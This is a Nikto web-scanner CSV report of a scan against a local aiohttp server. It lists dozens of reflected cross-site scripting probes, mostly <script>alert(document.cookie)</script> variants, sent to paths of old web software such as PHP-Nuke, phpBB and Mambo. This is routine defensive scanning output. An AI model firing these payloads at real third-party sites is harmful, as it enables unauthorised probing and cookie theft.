"Nikto - v2.1.5/2.1.5"
"localhost","127.0.0.1","80","","","","Python/3.11 aiohttp/3.8.6"
"localhost","127.0.0.1SCALAR(0x5654d290eba8)"80","OSVDB-0","GET","/","The anti-clickjacking X-Frame-Options header is not present."
"localhost","127.0.0.1SCALAR(0x5641f7c66378)"80","OSVDB-7498","GET","/administrator/gallery/view.php?path=\"<script>alert(document.cookie)</script>","/administrator/gallery/view.php?path=\\"<script>alert(document.cookie)</script>: Mambo PHP Portal/Server is vulnerable to Cross Site Scripting (XSS). CA-2000-02."
"localhost","127.0.0.1SCALAR(0x5641f7c66378)"80","OSVDB-7499","GET","/administrator/gallery/uploadimage.php?directory=\"<script>alert(document.cookie)</script>","/administrator/gallery/uploadimage.php?directory=\\"<script>alert(document.cookie)</script>: Mambo PHP Portal/Server is vulnerable to Cross Site Scripting (XSS). CA-2000-02."
"localhost","127.0.0.1SCALAR(0x5641f7c66378)"80","OSVDB-7497","GET","/administrator/gallery/navigation.php?directory=\"<script>alert(document.cookie)</script>","/administrator/gallery/navigation.php?directory=\\"<script>alert(document.cookie)</script>: Mambo PHP Portal/Server is vulnerable to Cross Site Scripting (XSS). CA-2000-02."
"localhost","127.0.0.1SCALAR(0x5641f7c66378)"80","OSVDB-7496","GET","/administrator/gallery/gallery.php?directory=\"<script>alert(document.cookie)</script>","/administrator/gallery/gallery.php?directory=\\"<script>alert(document.cookie)</script>: Mambo PHP Portal/Server is vulnerable to Cross Site Scripting (XSS). CA-2000-02."
"localhost","127.0.0.1SCALAR(0x5641f7c66378)"80","OSVDB-2820","GET","/index.php?dir=<script>alert('Vulnerable')</script>","/index.php?dir=<script>alert('Vulnerable')</script>: Auto Directory Index 1.2.3 and prior are vulnerable to XSS attacks."
"localhost","127.0.0.1SCALAR(0x5641f7c66378)"80","OSVDB-2876","GET","/clusterframe.jsp?cluster=<script>alert(document.cookie)</script>","/clusterframe.jsp?cluster=<script>alert(document.cookie)</script>: Macromedia JRun 4.x JMC Interface, clusterframe.jsp file is vulnerable to a XSS attack."
"localhost","127.0.0.1SCALAR(0x5641f7c66378)"80","OSVDB-0","GET","/upload.php?type=\"<script>alert(document.cookie)</script>","/upload.php?type=\\"<script>alert(document.cookie)</script>: Mambo PHP Portal/Server is vulnerable to Cross Site Scripting (XSS). CA-2000-02."
"localhost","127.0.0.1SCALAR(0x5641f7c66378)"80","OSVDB-0","GET","/webtop/wdk/samples/dumpRequest.jsp?J=%3Cscript%3Ealert('Vulnerable');%3C/script%3Ef","/webtop/wdk/samples/dumpRequest.jsp?J=%3Cscript%3Ealert('Vulnerable');%3C/script%3Ef: Documentum Webtop (Tomcat 4.1) is vulnerable to Cross Site Scripting (XSS). CA-2000-02."
"localhost","127.0.0.1SCALAR(0x5641f7c66378)"80","OSVDB-0","GET","/servlet/MsgPage?action=test&msg=<script>alert('Vulnerable')</script>","/servlet/MsgPage?action=test&msg=<script>alert('Vulnerable')</script>: NetDetector 3.0 and below are vulnerable to Cross Site Scripting (XSS). CA-2000-02."
"localhost","127.0.0.1SCALAR(0x5641f7c66378)"80","OSVDB-0","GET","/servlets/MsgPage?action=badlogin&msg=<script>alert('Vulnerable')</script>","/servlets/MsgPage?action=badlogin&msg=<script>alert('Vulnerable')</script>: The NetDetector install is vulnerable to Cross Site Scripting (XSS) in its invalid login message. CA-2000-02."
"localhost","127.0.0.1SCALAR(0x5641f7c66378)"80","OSVDB-0","GET","/admin/sh_taskframes.asp?Title=Configuraci%C3%B3n%20de%20registro%20Web&URL=MasterSettings/Web_LogSettings.asp?tab1=TabsWebServer%26tab2=TabsWebLogSettings%26__SAPageKey=5742D5874845934A134CD05F39C63240&ReturnURL=\"><script>alert(document.cookie)</script>","/admin/sh_taskframes.asp?Title=Configuraci%C3%B3n%20de%20registro%20Web&URL=MasterSettings/Web_LogSettings.asp?tab1=TabsWebServer%26tab2=TabsWebLogSettings%26__SAPageKey=5742D5874845934A134CD05F39C63240&ReturnURL=\\"><script>alert(document.cookie)</script>: IIS 6 on Windows 2003 is vulnerable to Cross Site Scripting (XSS) in certain error messages. CA-2000-02."
"localhost","127.0.0.1SCALAR(0x5641f7c66378)"80","OSVDB-17665","GET","/SiteServer/Knowledge/Default.asp?ctr=\"><script>alert('Vulnerable')</script>","/SiteServer/Knowledge/Default.asp?ctr=\\"><script>alert('Vulnerable')</script>: Site Server is vulnerable to Cross Site Scripting"
"localhost","127.0.0.1SCALAR(0x5641f7c66378)"80","OSVDB-3624","GET","/webcalendar/week.php?eventinfo=<script>alert(document.cookie)</script>","/webcalendar/week.php?eventinfo=<script>alert(document.cookie)</script>: Webcalendar 0.9.42 and below are vulnerable to Cross Site Scripting (XSS). CA-2000-02."
"localhost","127.0.0.1SCALAR(0x5641f7c66378)"80","OSVDB-0","GET","/user.php?op=userinfo&uname=<script>alert('hi');</script>","/user.php?op=userinfo&uname=<script>alert('hi');</script>: The PHP-Nuke installation is vulnerable to Cross Site Scripting (XSS). Update to versions above 5.3.1. CA-2000-02."
"localhost","127.0.0.1SCALAR(0x5641f7c66378)"80","OSVDB-41361","GET","/templates/form_header.php?noticemsg=<script>javascript:alert(document.cookie)</script>","/templates/form_header.php?noticemsg=<script>javascript:alert(document.cookie)</script>: MyMarket 1.71 is vulnerable to Cross Site Scripting (XSS). CA-2000-02."
"localhost","127.0.0.1SCALAR(0x5641f7c66378)"80","OSVDB-0","GET","/sunshop.index.php?action=storenew&username=<script>alert('Vulnerable')</script>","/sunshop.index.php?action=storenew&username=<script>alert('Vulnerable')</script>: SunShop is vulnerable to Cross Site Scripting (XSS) in the signup page. CA-200-02."
"localhost","127.0.0.1SCALAR(0x5641f7c66378)"80","OSVDB-20232","GET","/submit.php?subject=<script>alert('Vulnerable')</script>&story=<script>alert('Vulnerable')</script>&storyext=<script>alert('Vulnerable')</script>&op=Preview","/submit.php?subject=<script>alert('Vulnerable')</script>&story=<script>alert('Vulnerable')</script>&storyext=<script>alert('Vulnerable')</script>&op=Preview: This install of PHP-Nuke is vulnerable to Cross Site Scripting (XSS). CA-2000-02."
"localhost","127.0.0.1SCALAR(0x5641f7c66378)"80","OSVDB-27097","GET","/ss000007.pl?PRODREF=<script>alert('Vulnerable')</script>","/ss000007.pl?PRODREF=<script>alert('Vulnerable')</script>: Actinic E-Commerce services is vulnerable to Cross Site Scripting (XSS). CA-2000-02."
"localhost","127.0.0.1SCALAR(0x5641f7c66378)"80","OSVDB-2689","GET","/servlet/ContentServer?pagename=<script>alert('Vulnerable')</script>","/servlet/ContentServer?pagename=<script>alert('Vulnerable')</script>: Open Market Inc. ContentServer is vulnerable to Cross Site Scripting (XSS) in the login-error page. CA-2000-02."
"localhost","127.0.0.1SCALAR(0x5641f7c66378)"80","OSVDB-2322","GET","/search.php?searchstring=<script>alert(document.cookie)</script>","/search.php?searchstring=<script>alert(document.cookie)</script>: Gallery 1.3.4 and below is vulnerable to Cross Site Scripting (XSS). Upgrade to the latest version. BID-8288."
"localhost","127.0.0.1SCALAR(0x5641f7c66378)"80","OSVDB-50551","GET","/search.php?searchfor=\"><script>alert(1776)</script>","/search.php?searchfor=\\"><script>alert(1776)</script>: Siteframe 2.2.4 is vulnerable to Cross Site Scripting (XSS). CA-2000-02."
"localhost","127.0.0.1SCALAR(0x5641f7c66378)"80","OSVDB-0","GET","/samples/search.dll?query=<script>alert(document.cookie)</script>","/samples/search.dll?query=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). CA-2000-02."
"localhost","127.0.0.1SCALAR(0x5641f7c66378)"80","OSVDB-0","GET","/replymsg.php?send=1&destin=<script>alert('Vulnerable')</script>","/replymsg.php?send=1&destin=<script>alert('Vulnerable')</script>: This version of PHP-Nuke's replymsg.php is vulnerable to Cross Site Scripting (XSS). CA-2000-02."
"localhost","127.0.0.1SCALAR(0x5641f7c66378)"80","OSVDB-4599","GET","/pm_buddy_list.asp?name=A&desc=B%22%3E<script>alert('Vulnerable')</script>%3Ca%20s=%22&code=1","/pm_buddy_list.asp?name=A&desc=B%22%3E<script>alert('Vulnerable')</script>%3Ca%20s=%22&code=1: Web Wiz Forums ver. 7.01 and below is vulnerable to Cross Site Scripting (XSS). CA-2000-02."
"localhost","127.0.0.1SCALAR(0x5641f7c66378)"80","OSVDB-0","GET","/phpwebsite/index.php?module=search&SEA_search_op=continue&PDA_limit=10\"><script>alert('Vulnerable')</script>","/phpwebsite/index.php?module=search&SEA_search_op=continue&PDA_limit=10\\"><script>alert('Vulnerable')</script>: phpWebSite 0.9.x and below are vulnerable to Cross Site Scripting (XSS). CA-2000-02."
"localhost","127.0.0.1SCALAR(0x5641f7c66378)"80","OSVDB-0","GET","/phpwebsite/index.php?module=pagemaster&PAGE_user_op=view_page&PAGE_id=10\"><script>alert('Vulnerable')</script>&MMN_position=[X:X]","/phpwebsite/index.php?module=pagemaster&PAGE_user_op=view_page&PAGE_id=10\\"><script>alert('Vulnerable')</script>&MMN_position=[X:X]: phpWebSite 0.9.x and below are vulnerable to Cross Site Scripting (XSS). CA-2000-02."
"localhost","127.0.0.1SCALAR(0x5641f7c66378)"80","OSVDB-0","GET","/phpwebsite/index.php?module=fatcat&fatcat[user]=viewCategory&fatcat_id=1%00+\"><script>alert('Vulnerable')</script>","/phpwebsite/index.php?module=fatcat&fatcat[user]=viewCategory&fatcat_id=1%00+\\"><script>alert('Vulnerable')</script>: phpWebSite 0.9.x and below are vulnerable to Cross Site Scripting (XSS). CA-2000-02."
"localhost","127.0.0.1SCALAR(0x5641f7c66378)"80","OSVDB-0","GET","/phpwebsite/index.php?module=calendar&calendar[view]=day&month=2&year=2003&day=1+%00\"><script>alert('Vulnerable')</script>","/phpwebsite/index.php?module=calendar&calendar[view]=day&month=2&year=2003&day=1+%00\\"><script>alert('Vulnerable')</script>: phpWebSite 0.9.x and below are vulnerable to Cross Site Scripting (XSS). CA-2000-02."
"localhost","127.0.0.1SCALAR(0x5641f7c66378)"80","OSVDB-59093","GET","/phptonuke.php?filnavn=<script>alert('Vulnerable')</script>","/phptonuke.php?filnavn=<script>alert('Vulnerable')</script>: PHP-Nuke add-on PHPToNuke is vulnerable to Cross Site Scripting (XSS). CA-2000-02."
"localhost","127.0.0.1SCALAR(0x5641f7c66378)"80","OSVDB-37511","GET","/phprank/add.php?page=add&spass=1&name=2&siteurl=3&email=%3Cscript%3Ealert(Vulnerable)%3C/script%3E","/phprank/add.php?page=add&spass=1&name=2&siteurl=3&email=%3Cscript%3Ealert(Vulnerable)%3C/script%3E: phpRank is vulnerable to Cross Site Scripting (XSS). CA-2000-02."
"localhost","127.0.0.1SCALAR(0x5641f7c66378)"80","OSVDB-32774","GET","/phpinfo.php?VARIABLE=<script>alert('Vulnerable')</script>","/phpinfo.php?VARIABLE=<script>alert('Vulnerable')</script>: Contains PHP configuration information and is vulnerable to Cross Site Scripting (XSS)."
"localhost","127.0.0.1SCALAR(0x5641f7c66378)"80","OSVDB-32774","GET","/phpinfo.php3?VARIABLE=<script>alert('Vulnerable')</script>","/phpinfo.php3?VARIABLE=<script>alert('Vulnerable')</script>: Contains PHP configuration information and is vulnerable to Cross Site Scripting (XSS)."
"localhost","127.0.0.1SCALAR(0x5641f7c66378)"80","OSVDB-2193","GET","/phpBB/viewtopic.php?topic_id=<script>alert('Vulnerable')</script>","/phpBB/viewtopic.php?topic_id=<script>alert('Vulnerable')</script>: phpBB is vulnerable to Cross Site Scripting (XSS). Upgrade to the latest version. CA-2000-02."
"localhost","127.0.0.1SCALAR(0x5641f7c66378)"80","OSVDB-4297","GET","/phpBB/viewtopic.php?t=17071&highlight=\">\"<script>javascript:alert(document.cookie)</script>","/phpBB/viewtopic.php?t=17071&highlight=\\">\\"<script>javascript:alert(document.cookie)</script>: phpBB is vulnerable to Cross Site Scripting (XSS). CA-2000-02."
"localhost","127.0.0.1SCALAR(0x5641f7c66378)"80","OSVDB-11145","GET","/phorum/admin/header.php?GLOBALS[message]=<script>alert('Vulnerable')</script>","/phorum/admin/header.php?GLOBALS[message]=<script>alert('Vulnerable')</script>: Phorum 3.3.2a and below from phorum.org is vulnerable to Cross Site Scripting (XSS). CA-2000-02."
"localhost","127.0.0.1SCALAR(0x5641f7c66378)"80","OSVDB-11144","GET","/phorum/admin/footer.php?GLOBALS[message]=<script>alert('Vulnerable')</script>","/phorum/admin/footer.php?GLOBALS[message]=<script>alert('Vulnerable')</script>: Phorum 3.3.2a and below from phorum.org is vulnerable to Cross Site Scripting (XSS). CA-2000-02."
"localhost","127.0.0.1SCALAR(0x5641f7c66378)"80","OSVDB-0","GET","/Page/1,10966,,00.html?var=<script>alert('Vulnerable')</script>","/Page/1,10966,,00.html?var=<script>alert('Vulnerable')</script>: Vignette server is vulnerable to Cross Site Scripting (XSS). CA-2000-02. Upgrade to the latest version."
"localhost","127.0.0.1SCALAR(0x5641f7c66378)"80","OSVDB-2767","GET","/openautoclassifieds/friendmail.php?listing=<script>alert(document.domain);</script>","/openautoclassifieds/friendmail.php?listing=<script>alert(document.domain);</script>: OpenAutoClassifieds 1.0 is vulnerable to a XSS attack"
"localhost","127.0.0.1SCALAR(0x5641f7c66378)"80","OSVDB-5106","GET","/netutils/whodata.stm?sitename=<script>alert(document.cookie)</script>","/netutils/whodata.stm?sitename=<script>alert(document.cookie)</script>: Sambar Server default script is vulnerable to Cross Site Scripting (XSS). CA-2000-02."
"localhost","127.0.0.1SCALAR(0x5641f7c66378)"80","OSVDB-0","GET","/myhome.php?action=messages&box=<script>alert('Vulnerable')</script>","/myhome.php?action=messages&box=<script>alert('Vulnerable')</script>: OpenBB 1.0.0 RC3 is vulnerable to Cross Site Scripting (XSS). CA-2000-02."
"localhost","127.0.0.1SCALAR(0x5641f7c66378)"80","OSVDB-0","GET","/msadm/user/login.php3?account_name=\"><script>alert('Vulnerable')</script>","/msadm/user/login.php3?account_name=\\"><script>alert('Vulnerable')</script>: The Sendmail Server Site User login is vulnerable to Cross Site Scripting (XSS). CA-2000-02."
"localhost","127.0.0.1SCALAR(0x5641f7c66378)"80","OSVDB-0","GET","/msadm/site/index.php3?authid=\"><script>alert('Vulnerable')</script>","/msadm/site/index.php3?authid=\\"><script>alert('Vulnerable')</script>: The Sendmail Server Site Administrator Login is vulnerable to Cross Site Scripting (XSS). CA-2000-02."
"localhost","127.0.0.1SCALAR(0x5641f7c66378)"80","OSVDB-0","GET","/msadm/domain/index.php3?account_name=\"><script>alert('Vulnerable')</script>","/msadm/domain/index.php3?account_name=\\"><script>alert('Vulnerable')</script>: The Sendmail Server Site Domain Administrator login is vulnerable to Cross Site Scripting (XSS). CA-2000-02."
"localhost","127.0.0.1SCALAR(0x5641f7c66378)"80","OSVDB-50539","GET","/modules/Submit/index.php?op=pre&title=<script>alert(document.cookie);</script>","/modules/Submit/index.php?op=pre&title=<script>alert(document.cookie);</script>: Basit cms 1.0 is vulnerable to Cross Site Scripting (XSS). CA-2000-02."
"localhost","127.0.0.1SCALAR(0x5641f7c66378)"80","OSVDB-0","GET","/modules/Forums/bb_smilies.php?site_font=}--></style><script>alert('Vulnerable')</script>","/modules/Forums/bb_smilies.php?site_font=}--></style><script>alert('Vulnerable')</script>: PHP-Nuke 6.0 is vulnerable to Cross Site Scripting (XSS). CA-2000-02."
"localhost","127.0.0.1SCALAR(0x5641f7c66378)"80","OSVDB-0","GET","/modules/Forums/bb_smilies.php?name=<script>alert('Vulnerable')</script>","/modules/Forums/bb_smilies.php?name=<script>alert('Vulnerable')</script>: PHP-Nuke 6.0 is vulnerable to Cross Site Scripting (XSS). CA-2000-02."
"localhost","127.0.0.1SCALAR(0x5641f7c66378)"80","OSVDB-0","GET","/modules/Forums/bb_smilies.php?Default_Theme=<script>alert('Vulnerable')</script>","/modules/Forums/bb_smilies.php?Default_Theme=<script>alert('Vulnerable')</script>: PHP-Nuke 6.0 is vulnerable to Cross Site Scripting (XSS). CA-2000-02."
"localhost","127.0.0.1SCALAR(0x5641f7c66378)"80","OSVDB-0","GET","/modules/Forums/bb_smilies.php?bgcolor1=\"><script>alert('Vulnerable')</script>","/modules/Forums/bb_smilies.php?bgcolor1=\\"><script>alert('Vulnerable')</script>: PHP-Nuke 6.0 is vulnerable to Cross Site Scripting (XSS). CA-2000-02."
"localhost","127.0.0.1SCALAR(0x5641f7c66378)"80","OSVDB-0","GET","/modules.php?op=modload&name=Xforum&file=member&action=viewpro&member=<script>alert('Vulnerable')</script>","/modules.php?op=modload&name=Xforum&file=member&action=viewpro&member=<script>alert('Vulnerable')</script>: The XForum (PHP-Nuke Add-on module) is vulnerable to Cross Site Scripting (XSS). CA-2000-02."
"localhost","127.0.0.1SCALAR(0x5641f7c66378)"80","OSVDB-0","GET","/modules.php?op=modload&name=Xforum&file=<script>alert('Vulnerable')</script>&fid=2","/modules.php?op=modload&name=Xforum&file=<script>alert('Vulnerable')</script>&fid=2: The XForum (PHP-Nuke Add-on module) is vulnerable to Cross Site Scripting (XSS). CA-2000-02."
"localhost","127.0.0.1SCALAR(0x5641f7c66378)"80","OSVDB-5498","GET","/modules.php?op=modload&name=Wiki&file=index&pagename=<script>alert('Vulnerable')</script>","/modules.php?op=modload&name=Wiki&file=index&pagename=<script>alert('Vulnerable')</script>: Wiki PostNuke Module is vulnerable to Cross Site Scripting (XSS). CA-2000-02."
"localhost","127.0.0.1SCALAR(0x5641f7c66378)"80","OSVDB-0","GET","/modules.php?op=modload&name=Web_Links&file=index&l_op=viewlink&cid=<script>alert('Vulnerable')</script>","/modules.php?op=modload&name=Web_Links&file=index&l_op=viewlink&cid=<script>alert('Vulnerable')</script>: The PHP-Nuke forum is vulnerable to Cross Site Scripting (XSS). CA-2000-02."
"localhost","127.0.0.1SCALAR(0x5641f7c66378)"80","OSVDB-0","GET","/modules.php?op=modload&name=WebChat&file=index&roomid=<script>alert('Vulnerable')</script>","/modules.php?op=modload&name=WebChat&file=index&roomid=<script>alert('Vulnerable')</script>: The PHP-Nuke forum is vulnerable to Cross Site Scripting (XSS). CA-2000-02."
"localhost","127.0.0.1SCALAR(0x5641f7c66378)"80","OSVDB-0","GET","/modules.php?op=modload&name=Members_List&file=index&letter=<script>alert('Vulnerable')</script>","/modules.php?op=modload&name=Members_List&file=index&letter=<script>alert('Vulnerable')</script>: This install of PHP-Nuke's modules.php is vulnerable to Cross Site Scripting (XSS). CA-2000-02."
"localhost","127.0.0.1SCALAR(0x5641f7c66378)"80","OSVDB-0","GET","/modules.php?op=modload&name=Guestbook&file=index&entry=<script>alert('Vulnerable')</script>","/modules.php?op=modload&name=Guestbook&file=index&entry=<script>alert('Vulnerable')</script>: The PHP-Nuke forum is vulnerable to Cross Site Scripting (XSS). CA-2000-02."
"localhost","127.0.0.1SCALAR(0x5641f7c66378)"80","OSVDB-0","GET","/modules.php?op=modload&name=FAQ&file=index&myfaq=yes&id_cat=1&categories=%3Cimg%20src=javascript:alert(9456);%3E&parent_id=0","/modules.php?op=modload&name=FAQ&file=index&myfaq=yes&id_cat=1&categories=%3Cimg%20src=javascript:alert(9456);%3E&parent_id=0: Post Nuke 0.7.2.3-Phoenix is vulnerable to Cross Site Scripting (XSS). CA-2000-02."
"localhost","127.0.0.1SCALAR(0x5641f7c66378)"80","OSVDB-20235","GET","/modules.php?op=modload&name=DMOZGateway&file=index&topic=<script>alert('Vulnerable')</script>","/modules.php?op=modload&name=DMOZGateway&file=index&topic=<script>alert('Vulnerable')</script>: The DMOZGateway (PHP-Nuke Add-on module) is vulnerable to Cross Site Scripting (XSS). CA-2000-02."
"localhost","127.0.0.1SCALAR(0x5641f7c66378)"80","OSVDB-0","GET","/modules.php?name=Your_Account&op=userinfo&username=bla<script>alert(document.cookie)</script>","/modules.php?name=Your_Account&op=userinfo&username=bla<script>alert(document.cookie)</script>: Francisco Burzi PHP-Nuke 5.6, 6.0, 6.5 RC1/RC2/RC3, 6.5 is vulnerable to Cross Site Scripting (XSS). CA-2000-02."
"localhost","127.0.0.1SCALAR(0x5641f7c66378)"80","OSVDB-0","GET","/modules.php?name=Your_Account&op=userinfo&uname=<script>alert('Vulnerable')</script>","/modules.php?name=Your_Account&op=userinfo&uname=<script>alert('Vulnerable')</script>: The PHP-Nuke forum is vulnerable to Cross Site Scripting (XSS). CA-2000-02."
"localhost","127.0.0.1SCALAR(0x5641f7c66378)"80","OSVDB-0","GET","/modules.php?name=Surveys&pollID=<script>alert('Vulnerable')</script>","/modules.php?name=Surveys&pollID=<script>alert('Vulnerable')</script>: The PHP-Nuke forum is vulnerable to Cross Site Scripting (XSS). CA-2000-02."
"localhost","127.0.0.1SCALAR(0x5641f7c66378)"80","OSVDB-6226","GET","/modules.php?name=Stories_Archive&sa=show_month&year=<script>alert('Vulnerable')</script>&month=3&month_l=test","/modules.php?name=Stories_Archive&sa=show_month&year=<script>alert('Vulnerable')</script>&month=3&month_l=test: The PHP-Nuke forum is vulnerable to Cross Site Scripting (XSS). CA-2000-02."
"localhost","127.0.0.1SCALAR(0x5641f7c66378)"80","OSVDB-6226","GET","/modules.php?name=Stories_Archive&sa=show_month&year=2002&month=03&month_l=<script>alert('Vulnerable')</script>","/modules.php?name=Stories_Archive&sa=show_month&year=2002&month=03&month_l=<script>alert('Vulnerable')</script>: The PHP-Nuke forum is vulnerable to Cross Site Scripting (XSS). CA-2000-02."
"localhost","127.0.0.1SCALAR(0x5641f7c66378)"80","OSVDB-5914","GET","/modules.php?name=Downloads&d_op=viewdownloaddetails&lid=02&ttitle=<script>alert('Vulnerable')</script>","/modules.php?name=Downloads&d_op=viewdownloaddetails&lid=02&ttitle=<script>alert('Vulnerable')</script>: This install of PHP-Nuke is vulnerable to Cross Site Scripting (XSS). CA-2000-02."
"localhost","127.0.0.1SCALAR(0x5641f7c66378)"80","OSVDB-0","GET","/modules.php?name=Classifieds&op=ViewAds&id_subcatg=75&id_catg=<script>alert('Vulnerable')</script>","/modules.php?name=Classifieds&op=ViewAds&id_subcatg=75&id_catg=<script>alert('Vulnerable')</script>: The PHP-Nuke forum is vulnerable to Cross Site Scripting (XSS). CA-2000-02."
